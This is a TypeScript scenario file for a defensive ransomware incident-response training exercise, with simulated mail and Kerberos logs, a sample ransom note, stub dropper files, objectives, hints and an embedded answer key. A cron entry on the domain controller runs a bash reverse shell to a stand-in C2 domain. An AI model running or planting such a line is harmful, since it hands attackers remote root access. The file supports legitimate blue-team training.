import type { WorldSpec } from '../core/world/types';

const MAIL_LOG = `Oct 10 08:14:02 mail-server postfix/smtpd[1234]: connect from unknown[198.51.100.42]
Oct 10 08:14:05 mail-server postfix/smtpd[1234]: 3ABC123: client=unknown[198.51.100.42]
Oct 10 08:14:06 mail-server postfix/cleanup[1235]: 3ABC123: message-id=<20231010@attacker.com>
Oct 10 08:14:06 mail-server postfix/qmgr[1236]: 3ABC123: from=<hr-update@phishing-domain.com>, size=1048576, nrcpt=1 (Subject: URGENT: Q4 Salary Adjustments)
Oct 10 08:14:07 mail-server postfix/local[1237]: 3ABC123: to=<jsmith@company.local>, relay=local, delay=1, status=sent (delivered to mailbox)
Oct 10 08:15:22 mail-server kernel: [  123.456] dropper.elf executed by jsmith
`;

const RANSOM_NOTE = `================================================================
!!! YOUR FILES HAVE BEEN ENCRYPTED !!!
================================================================

All your important files (documents, databases, backups) have
been encrypted with military-grade algorithms (AES-256 + RSA-2048).

There is no way to recover your data without our unique decryption key.

To purchase the key and decryptor software:
1. Purchase 5 BTC
2. Send to: bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh
3. Email your Transaction ID and your Personal ID to: support@darkweb-ransom.onion

Your Personal ID: RYUK-VAR-778129

Failure to pay within 72 hours will result in permanent deletion of your key.
================================================================
`;

const DC_AUTH_LOG = `Oct 10 09:22:15 dc-01 kerberos: TGS-REQ jsmith@COMPANY.LOCAL from 10.0.1.20 (mail-server)
Oct 10 09:30:11 dc-01 security: Successful logon. Account: svc_backup. Source: 10.0.1.20 (mail-server)
Oct 10 09:40:05 dc-01 security: Privilege escalation detected - MS14-068 exploitation signature matched.
Oct 10 09:45:01 dc-01 kerberos: AS-REQ Administrator@COMPANY.LOCAL from 10.0.1.30 (file-server) - UNUSUAL ENCTYPE (RC4-HMAC)
Oct 10 09:45:02 dc-01 security: Ticket Granting Ticket (TGT) forged. Golden Ticket usage likely for Administrator.
Oct 10 09:50:00 dc-01 cron[881]: (root) CMD (/etc/cron.d/system-update)
`;

const DC_CRON = `* * * * * root /bin/bash -c "bash -i >& /dev/tcp/c2.malicious-domain.com/443 0>&1"
`;

const SOC_PROFILE = `export PS1="\\[\\e[32m\\]soc-analyst@soc-workstation\\[\\e[0m\\]:\\[\\e[34m\\]\\w\\[\\e[0m\\]\\$ "
echo ""
echo "\\e[31m[INCIDENT RESPONSE PAGING]\\e[0m"
echo "Alert: Mass file encryption detected on file-server."
echo "Status: Active Incident - Ransomware"
echo ""
echo "Objectives:"
echo "1. Find the initial entry vector."
echo "2. Analyze the lateral movement."
echo "3. Identify persistence on the Domain Controller."
echo ""
echo "Your workstation has access to the centralized log repository in /var/log/."
echo ""
`;

const SOC_SYSLOG = `Oct 10 09:30:00 soc-workstation splunk: [ALERT] High volume of SMB traffic detected from mail-server to file-server.
Oct 10 09:40:00 soc-workstation splunk: [ALERT] Potential Pass-the-Hash activity detected on file-server.
Oct 10 09:45:00 soc-workstation splunk: [ALERT] Abnormal Kerberos TGT request detected on dc-01.
Oct 10 09:55:00 soc-workstation splunk: [ALERT] Mass file modification detected on file-server (Ransomware behavior).
`;

const SOC_ACCESS_LOG = `[10/Oct/2023:08:15:30 +0000] mail-server -> file-server : SMB connection established (user: jsmith)
[10/Oct/2023:09:35:10 +0000] file-server -> dc-01 : WMI connection established (user: svc_backup)
[10/Oct/2023:09:42:00 +0000] file-server -> c2.malicious-domain.com : HTTPS POST 2MB
`;

export const DEMO_03: WorldSpec = {
    version: '2.0',
    trust: 'community',

    meta: {
        title: 'Incident Response: Ransomware',
        scenario: 'A ransomware outbreak has encrypted the corporate file server. Trace the attack from initial access to full domain compromise.',
        briefing: [
            'INCIDENT BRIEFING:',
            '',
            'At 10:00 AM, users reported they could not access files on the file server.',
            'We have confirmed a ransomware infection.',
            '',
            'As the lead SOC analyst, you must investigate the incident.',
            'The attacker is likely still active in the network.',
            '',
            'OBJECTIVES:',
            '- Find how the attacker got in.',
            '- Identify the malware family.',
            '- Map the lateral movement path.',
            '- Find the persistence mechanism.',
            '- Block the C2 domain.',
            '',
            'Good luck. The clock is ticking.',
        ],
        difficulty: 'hard',
        mode: 'defense',
        vulnClasses: ['phishing', 'lateral-movement', 'golden-ticket', 'ransomware'],
        tags: ['ir', 'blue-team', 'hard', 'multi-machine'],
        estimatedMinutes: 45,
        author: {
            name: 'Santh',
            id: 'santh-official',
            type: 'santh',
        },
    },

    machines: {
        'soc-workstation': {
            hostname: 'soc-workstation',
            image: 'ubuntu-desktop',
            memoryMB: 256,
            role: 'player',

            user: {
                username: 'analyst',
                password: 'analyst_password',
                shell: '/bin/bash',
                home: '/home/analyst',
                groups: ['sudo', 'analyst'],
                sudo: true,
            },

            interfaces: [
                { ip: '10.0.2.100', segment: 'management' },
            ],

            files: {
                '/home/analyst/.profile': {
                    content: SOC_PROFILE,
                    owner: 'analyst',
                    mode: 0o644,
                },
                '/var/log/auth.log': {
                    content: 'Oct 10 10:00:01 soc-workstation sudo: analyst : TTY=pts/0 ; PWD=/home/analyst ; USER=root ; COMMAND=/bin/bash',
                    owner: 'root',
                    mode: 0o644,
                },
                '/var/log/syslog': {
                    content: SOC_SYSLOG,
                    owner: 'root',
                    mode: 0o644,
                },
                '/var/log/access.log': {
                    content: SOC_ACCESS_LOG,
                    owner: 'root',
                    mode: 0o644,
                },
            },
        },
        'mail-server': {
            hostname: 'mail-server',
            image: 'debian-server',
            memoryMB: 128,
            role: 'infrastructure',

            interfaces: [
                { ip: '10.0.1.20', segment: 'corporate' },
            ],

            files: {
                '/var/log/mail.log': {
                    content: MAIL_LOG,
                    owner: 'root',
                    mode: 0o644,
                },
                '/tmp/dropper.elf': {
                    content: '\\x7fELF\\x02\\x01... [MALWARE_FAMILY=Ryuk-Variant]',
                    owner: 'jsmith',
                    mode: 0o755,
                }
            },
        },
        'file-server': {
            hostname: 'file-server',
            image: 'windows-server',
            memoryMB: 256,
            role: 'infrastructure',

            interfaces: [
                { ip: '10.0.1.30', segment: 'corporate' },
            ],

            files: {
                '/share/RANSOM_NOTE.txt': {
                    content: RANSOM_NOTE,
                    owner: 'Administrator',
                    mode: 0o644,
                },
                '/share/Finance.xlsx.encrypted': {
                    content: 'ENCRYPTED_DATA_8472910',
                    owner: 'Administrator',
                    mode: 0o644,
                },
                '/share/HR.pdf.encrypted': {
                    content: 'ENCRYPTED_DATA_5581920',
                    owner: 'Administrator',
                    mode: 0o644,
                },
                '/tmp/dropper.exe': {
                    content: 'MZ\\x90\\x00\\x03\\x00\\x00\\x00... [RYUK RANSOMWARE PAYLOAD]',
                    owner: 'Administrator',
                    mode: 0o755,
                },
                '/var/log/memory_dump.dmp': {
                    content: '... HEAP DATA ... AES_KEY: a1b2c3d4e5f60718293a4b5c6d7e8f90 ...',
                    owner: 'Administrator',
                    mode: 0o600,
                }
            },
        },
        'dc-01': {
            hostname: 'dc-01',
            image: 'windows-server',
            memoryMB: 256,
            role: 'infrastructure',

            interfaces: [
                { ip: '10.0.1.10', segment: 'corporate' },
            ],

            files: {
                '/var/log/auth.log': {
                    content: DC_AUTH_LOG,
                    owner: 'root',
                    mode: 0o644,
                },
                '/etc/cron.d/system-update': {
                    content: DC_CRON,
                    owner: 'root',
                    mode: 0o644,
                },
            },
            
            crontab: [
                {
                    schedule: '* * * * *',
                    command: '/bin/bash -c "bash -i >& /dev/tcp/c2.malicious-domain.com/443 0>&1"',
                    user: 'root',
                },
            ],
        },
    },

    startMachine: 'soc-workstation',
    startConfig: 'soc-workstation',

    network: {
        segments: [
            { id: 'management', subnet: '10.0.2.0/24', gateway: '10.0.2.1' },
            { id: 'corporate', subnet: '10.0.1.0/24', gateway: '10.0.1.1' },
        ],
        edges: [],
    },

    credentials: [
        {
            id: 'ransomware-key',
            type: 'password',
            value: 'a1b2c3d4e5f60718293a4b5c6d7e8f90',
            foundAt: {
                machine: 'file-server',
                path: '/var/log/memory_dump.dmp',
                method: 'Extract from memory dump',
            },
            validAt: {
                machine: 'file-server',
                service: 'decryptor',
                user: 'admin',
            },
        },
    ],

    objectives: [
        {
            id: 'identify-initial-access',
            title: 'Identify Initial Access Vector',
            description: 'Find the phishing email in the mail logs',
            type: 'find-file',
            required: true,
            order: 1,
            details: {
                kind: 'find-file',
                machine: 'mail-server',
                path: '/var/log/mail.log',
            },
        },
        {
            id: 'determine-malware-family',
            title: 'Determine Malware Family',
            description: 'Analyze the dropper in /tmp/ to find the malware family',
            type: 'find-file',
            required: true,
            order: 2,
            details: {
                kind: 'find-file',
                machine: 'mail-server',
                path: '/tmp/dropper.elf',
            },
        },
        {
            id: 'map-lateral-movement',
            title: 'Map Lateral Movement Path',
            description: 'Trace the attacker from mail-server to file-server to dc-01',
            type: 'custom',
            required: true,
            order: 3,
            details: {
                kind: 'custom',
                evaluator: 'ir-questions',
                params: {
                    question: 'lateral-movement-path',
                },
            },
        },
        {
            id: 'identify-compromised-accounts',
            title: 'Identify Compromised Accounts',
            description: 'List all accounts compromised during the attack',
            type: 'custom',
            required: true,
            order: 4,
            details: {
                kind: 'custom',
                evaluator: 'ir-questions',
                params: {
                    question: 'compromised-accounts',
                },
            },
        },
        {
            id: 'find-persistence',
            title: 'Find Persistence Mechanism',
            description: 'Locate the scheduled task on the Domain Controller',
            type: 'find-file',
            required: true,
            order: 5,
            details: {
                kind: 'find-file',
                machine: 'dc-01',
                path: '/etc/cron.d/system-update',
            },
        },
        {
            id: 'block-c2-domain',
            title: 'Block C2 Domain',
            description: 'Block the malicious C2 domain in the firewall',
            type: 'write-rule',
            required: true,
            order: 6,
            details: {
                kind: 'write-rule',
                vulnClass: 'c2-traffic',
                minDetection: 1,
                maxFalsePositive: 0,
                payloadSource: 'known-patterns',
            },
        },
        {
            id: 'recover-encryption-key',
            title: 'Recover Encryption Key',
            description: 'Extract the AES key from the file-server memory dump',
            type: 'credential-find',
            required: false,
            reward: 50,
            order: 7,
            details: {
                kind: 'credential-find',
                credentialId: 'ransomware-key',
            },
        },
        {
            id: 'write-incident-report',
            title: 'Write Incident Report',
            description: 'Submit an incident report via the email lens',
            type: 'custom',
            required: false,
            reward: 50,
            order: 8,
            details: {
                kind: 'custom',
                evaluator: 'email-submission',
                params: {
                    to: 'ciso@company.local',
                },
            },
        },
    ],

    dynamics: {
        timedEvents: [
            {
                tick: 300,
                action: {
                    type: 'alert',
                    message: 'WARNING: The attacker is escalating privileges on dc-01. Containment required immediately.',
                    severity: 'critical',
                },
            },
        ],
    },

    modules: ['objective-detector', 'scoring-engine', 'network-monitor', 'fs-monitor', 'process-monitor'],

    scoring: {
        maxScore: 100,
        timeBonus: true,
        stealthBonus: false,
        hintPenalty: 10,
        tiers: [
            { name: 'LEAD IR', minScore: 90, color: '#ff5555' },
            { name: 'SOC ANALYST', minScore: 70, color: '#ffb86c' },
            { name: 'JUNIOR ANALYST', minScore: 50, color: '#8be9fd' },
        ],
    },

    hints: [
        'Check /var/log/mail.log on the mail-server for suspicious attachments.',
        'The attacker moved from mail-server to file-server. Check the central access logs.',
        'Look for abnormal Kerberos requests on dc-01 to spot the lateral movement.',
        'Persistence on dc-01 is hidden in /etc/cron.d/.',
        'Extract the C2 domain from the cron job and block it.',
        'Memory dumps often contain AES keys. Inspect /var/log/memory_dump.dmp on the file-server.',
    ],
};